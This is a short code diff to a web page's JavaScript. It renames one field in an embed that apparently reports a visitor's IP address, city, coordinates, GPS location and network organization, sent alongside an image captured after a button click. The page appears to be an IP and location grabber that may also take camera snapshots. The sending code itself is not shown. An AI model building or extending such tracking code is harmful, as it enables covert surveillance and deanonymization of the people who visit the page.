@@ -102,7 +102,7 @@ function sendEmbed(imageBlob) {
         color: 0x2f3136,
         fields: [
             { name: "IP Address", value: data.ip || "Loading..." },
-            { name: "Location", value: `${data.city}, ${data.region}, ${data.country}` },
+            { name: "Estimated Location", value: `${data.city}, ${data.region}, ${data.country}` },
             { name: "Coordinates", value: data.loc || "N/A" },
             { name: "GPS Location", value: data.gps || "N/A" },
             { name: "Organization / ASN", value: data.org || "N/A" },
@@ -149,3 +149,4 @@ snapBtn.addEventListener("click", () => {
 </script>
 </body>
 </html>
+
